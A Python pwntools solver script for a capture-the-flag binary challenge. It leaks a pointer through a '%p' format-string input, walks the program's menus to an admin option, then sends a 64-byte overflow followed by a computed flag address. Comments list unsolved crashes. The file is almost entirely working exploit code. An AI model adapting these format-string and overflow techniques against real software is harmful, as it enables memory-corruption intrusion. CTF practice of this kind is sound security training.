from pwn import *
import time

REMOTE = False

context.terminal = 'alacritty'

if REMOTE:
    p = remote("pwn.challenges.hfctf.ca", 1234)
else:
    # p = gdb.debug('./pwn_chall/chal1', 'b *admin+0x1b7')
    p = process('./pwn_chall/chal1')

if REMOTE:
    print('Waiting cause remote')
    time.sleep(10)

for i in range(32):
    print(p.readline())
p.recv()

# Get pointer
p.sendline(b'3')
print(p.readline())
p.sendline(b'1')
print(p.readline())
p.sendline(b'%p')
p.sendline(b'\n')
print(p.readuntil(b'is wrong: '))
leaked_pointer = int(p.readline().strip().decode()[2:],16)
print(f'Leaked pointer: {leaked_pointer}')
print(p.readuntil(b'no:'))
p.sendline(b'n')

for i in range(8):
    print(p.readline())
p.recv()

# Go to admin
p.sendline(b'57005')

for i in range(2):
    print(p.readline())

print('=====\nwaiting...')
time.sleep(10)
print('=====\ndone waiting.')
print(p.readline())

print('=====\nsending bubbles')
p.sendline(b'bubbles1')
for i in range(4):
    print(p.readline())

print('=====\nsending payload')
flag_addr = leaked_pointer - 0x2a8893ee4d78
p.sendline(b'a'*64 + flag_addr.to_bytes(8, 'little'))
for i in range(8):
    print(p.readline())

# Problem 1: Leak the address
# Problem 2: Even when no need for leak, program crashes after puts

# print(cyclic(600))

# 66 